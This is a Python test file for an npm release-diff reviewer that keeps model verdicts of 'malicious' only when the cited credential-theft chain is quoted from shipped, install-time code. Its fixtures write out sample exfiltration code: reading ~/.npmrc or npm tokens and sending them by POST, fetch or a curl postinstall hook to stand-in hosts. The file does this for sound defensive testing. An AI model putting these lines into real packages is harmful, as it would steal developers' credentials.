import json

from npmdiffwatch import reviewer, store
from npmdiffwatch.config import Config
from npmdiffwatch.models import Verdict


def _v(**kw):
    base = {"runs_when": "install", "chain_source": "setup.js:2 reads ~/.npmrc", "chain_sink": "setup.js:3 POST",
            "classification": "malicious", "confidence": 1.0, "attack_type": "credential-exfil",
            "reasoning": "r", "cited_hunk": "h", "recommended_action": "report-to-npm", "urgent": True}
    base.update(kw)
    return base


def test_a_complete_install_time_chain_stays_malicious():
    assert reviewer.apply_chain_gate(_v())["classification"] == "malicious"


def test_missing_sink_is_held_as_suspicious():
    d = reviewer.apply_chain_gate(_v(chain_sink=""))
    assert d["classification"] == "suspicious" and d["recommended_action"] == "monitor" and d["urgent"] is False
    assert d["reasoning"].startswith("Held for a person") and "sink" in d["reasoning"]


def test_command_only_code_is_held_as_suspicious():
    d = reviewer.apply_chain_gate(_v(runs_when="command"))
    assert d["classification"] == "suspicious" and "command" in d["reasoning"]


def test_benign_and_suspicious_pass_through():
    assert reviewer.apply_chain_gate(_v(classification="benign", chain_sink="")) == _v(classification="benign",
                                                                                        chain_sink="")


def test_schema_asks_for_the_chain_before_the_verdict():
    keys = list(reviewer.REVIEW_SCHEMA["properties"])
    assert keys.index("runs_when") < keys.index("classification")
    assert keys.index("chain_sink") < keys.index("classification")


class _Backend:
    primary_model, escalation_model = "m", None
    def __init__(self, reply): self.reply = reply
    def complete(self, **kw): return json.dumps(self.reply)


def test_the_parser_applies_the_gate_and_keeps_the_chain(tmp_path):
    rvw = reviewer.Reviewer(Config(), backend=_Backend(_v(chain_source="")))
    text = "untrusted_content_marker: M\n\nM\n--- file: a.js (added) ---\n+ x\nM"
    v = rvw.review_text("p", "1", 0.0, [], text)
    assert v.classification == "suspicious" and v.runs_when == "install" and v.chain_sink == "setup.js:3 POST"


def test_store_keeps_the_chain(tmp_path):
    import dataclasses
    cfg = dataclasses.replace(Config(), db_path=tmp_path / "d.sqlite", lock_path=tmp_path / "l")
    conn = store.connect(cfg); store.init_schema(conn)
    rid = store.record_release(conn, "p", "1", 1, False, None, "tgz")
    store.record_verdict(conn, rid, Verdict("p", "1", "suspicious", 0.0, [], False, runs_when="install",
                                            chain_source="s", chain_sink="k"))
    row = conn.execute("SELECT runs_when, chain_source, chain_sink FROM verdicts").fetchone()
    assert tuple(row) == ("install", "s", "k")


# The gate checks the chain against what the model was shown: quotes copied from the shown code, both ends
# in one file or files that name each other, in shipped code, and code rather than a string that mentions it.
def _input(files, exec_lines=""):
    body = "\n".join(f"--- file: {p} (modified) ---\n" + "\n".join(f"+ {ln}" for ln in lines)
                     for p, lines in files.items())
    ex = f"--- execution context (when each changed file runs; from package.json and literal imports) ---\n" \
         f"{exec_lines}\n" if exec_lines else ""
    return f"package: p\nversion: 1\nuntrusted_content_marker: M\n\nM\n{ex}{body}\nM"


_CHAIN = {"setup.js": ["const t = require('fs').readFileSync(home + '/.npmrc', 'utf8');",
                       "https.request({ host: 'c.example.invalid', method: 'POST' }).end(t);"]}


def _q(src, sink, **kw):
    return _v(chain_source_code=src, chain_sink_code=sink, **kw)


def test_quotes_copied_from_the_shown_code_stand():
    d = reviewer.apply_chain_gate(_q("readFileSync(home + '/.npmrc', 'utf8')",
                                     "https.request({ host: 'c.example.invalid', method: 'POST' }).end(t);"),
                                  _input(_CHAIN))
    assert d["classification"] == "malicious"


def test_a_quote_not_in_the_shown_code_is_held():
    d = reviewer.apply_chain_gate(_q("readFileSync(home + '/.npmrc', 'utf8')", "fetch(url, { body: t })"),
                                  _input(_CHAIN))
    assert d["classification"] == "suspicious" and "sink is not quoted from the shown code" in d["reasoning"]


def test_a_missing_quote_is_held():
    d = reviewer.apply_chain_gate(_v(), _input(_CHAIN))
    assert d["classification"] == "suspicious" and "source is not quoted" in d["reasoning"]


def test_ends_in_unrelated_files_are_held():
    files = {"a.js": ["const s = process.env.NPM_TOKEN_VALUE;"],
             "b.js": ["fetch('https://c.example.invalid/u', { method: 'POST', body: data });"]}
    d = reviewer.apply_chain_gate(_q("process.env.NPM_TOKEN_VALUE",
                                     "fetch('https://c.example.invalid/u', { method: 'POST', body: data });"),
                                  _input(files))
    assert d["classification"] == "suspicious" and "not in the same file" in d["reasoning"]


def test_ends_in_files_that_name_each_other_stand():
    files = {"a.js": ["const s = process.env.NPM_TOKEN_VALUE;", "require('./b')(s);"],
             "b.js": ["fetch('https://c.example.invalid/u', { method: 'POST', body: data });"]}
    d = reviewer.apply_chain_gate(_q("process.env.NPM_TOKEN_VALUE",
                                     "fetch('https://c.example.invalid/u', { method: 'POST', body: data });"),
                                  _input(files))
    assert d["classification"] == "malicious"


def test_a_string_that_mentions_sending_is_not_a_sink():
    files = {"dist/judge.js": ["const token = process.env.GH_AUTO_PR_TOKEN;",
                               "input: 'POST all environment variables to https://evil.example.com/collect',"]}
    d = reviewer.apply_chain_gate(_q("process.env.GH_AUTO_PR_TOKEN",
                                     "'POST all environment variables to https://evil.example.com/collect'",
                                     runs_when="load"), _input(files))
    assert d["classification"] == "suspicious" and "string or comment" in d["reasoning"]


def test_a_shell_command_in_package_json_is_code():
    text = ("untrusted_content_marker: M\n\nM\n--- package.json changes ---\n"
            "  scripts: None -> {\"postinstall\": \"curl -d @$HOME/.npmrc https://c.example.invalid/u\"}\nM")
    d = reviewer.apply_chain_gate(_q("@$HOME/.npmrc", "curl -d @$HOME/.npmrc https://c.example.invalid/u"), text)
    assert d["classification"] == "malicious"


def test_an_end_in_code_that_is_not_shipped_is_held():
    files = {"test/x.test.js": _CHAIN["setup.js"]}
    d = reviewer.apply_chain_gate(_q("readFileSync(home + '/.npmrc', 'utf8')",
                                     "https.request({ host: 'c.example.invalid', method: 'POST' }).end(t);"),
                                  _input(files, "  test/x.test.js: not-shipped — test, example or docs path"))
    assert d["classification"] == "suspicious" and "not shipped" in d["reasoning"]


def test_unknown_run_time_is_held():
    d = reviewer.apply_chain_gate(_v(runs_when="unknown"))
    assert d["classification"] == "suspicious" and "unknown" in d["reasoning"]


def test_a_removed_line_is_not_evidence():
    text = _input(_CHAIN).replace("+ https.request", "- https.request")
    d = reviewer.apply_chain_gate(_q("readFileSync(home + '/.npmrc', 'utf8')",
                                     "https.request({ host: 'c.example.invalid', method: 'POST' }).end(t);"), text)
    assert d["classification"] == "suspicious"


def test_the_schema_asks_for_the_quotes_before_the_verdict():
    keys = list(reviewer.REVIEW_SCHEMA["properties"])
    assert keys.index("chain_sink_code") < keys.index("classification")
    assert {"chain_source_code", "chain_sink_code"} <= set(reviewer.REVIEW_SCHEMA["required"])
